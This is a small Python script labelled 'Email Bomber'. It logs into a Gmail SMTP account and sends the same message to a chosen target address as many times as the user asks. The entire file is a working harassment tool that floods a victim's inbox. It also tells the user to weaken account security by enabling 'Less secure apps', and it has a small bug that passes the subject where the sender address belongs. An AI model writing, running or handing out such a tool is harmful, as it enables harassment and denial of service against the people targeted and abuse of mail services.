import smtplib
from getpass import getpass
import sys

print('\033c')
print("""####\033[1mEmail Bomber###\n\033[0m""")
target = input("Enter target email : ")
num = input("How many bombs?    : ")

server = smtplib.SMTP('smtp.gmail.com', 587)#Enter your mail server details if not google!

server.ehlo()
server.starttls()
server.ehlo()

try: server.login(input("Enter your Email   : "), getpass("Enter your password: "))
except smtplib.SMTPAuthenticationError:print("Go to this site and enable \"Less secure apps\": \033[92mhttps://myaccount.google.com/lesssecureapps\033[0m"); sys.exit()
sub, body = input("Enter Subject      : "), input("Enter Body: ")
count = 1
for i in range(int(num)):
	server.sendmail(sub, target, body)
	print(f"[{count}/{num}] Sent!")
	count += 1

print("\033[1mDone!\033[0m")
server.close()